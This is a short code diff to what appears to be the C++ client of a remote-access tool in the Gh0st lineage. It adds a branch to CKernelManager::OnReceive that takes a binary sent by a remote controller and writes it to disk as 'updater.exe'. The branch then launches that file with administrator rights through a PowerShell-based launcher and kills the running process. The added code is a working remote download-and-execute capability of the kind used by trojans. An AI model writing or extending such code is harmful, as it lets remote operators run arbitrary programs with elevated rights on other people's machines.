@@ -949,6 +949,25 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
                 TerminateProcess(GetCurrentProcess(), 0xABCDEF);
             }
             Mprintf("CKernelManager: [%s] Update FAILED.\n", curFile);
+        } else if(typ == CLIENT_TYPE_ONE){
+            ULONGLONG size = 0;
+            memcpy(&size, (const char*)szBuffer + 1, sizeof(ULONGLONG));
+			const char* name = "updater.exe";
+            char curFile[_MAX_PATH] = {};
+            GetModuleFileName(NULL, curFile, MAX_PATH);
+            GET_FILEPATH(curFile, name);
+            DeleteFileA(curFile);
+            if (!WriteBinaryToFile((const char*)szBuffer + 1 + sizeof(ULONGLONG), size, name)) {
+                Mprintf("CKernelManager: Write \"%s\" failed.\n", curFile);
+                break;
+            }
+            if (IsPowerShellAvailable() && StartAdminLauncherAndExit(curFile, false)) {
+                g_bExit = S_CLIENT_UPDATE;
+                Mprintf("CKernelManager: [%s] Will be executed.\n", curFile);
+                Sleep(1000);
+                TerminateProcess(GetCurrentProcess(), 0xABCDEF);
+            }
+            Mprintf("CKernelManager: [%s] Execute FAILED.\n", curFile);
         } else {
             Mprintf("=====> 客户端类型'%d'不支持文件升级\n", typ);
         }
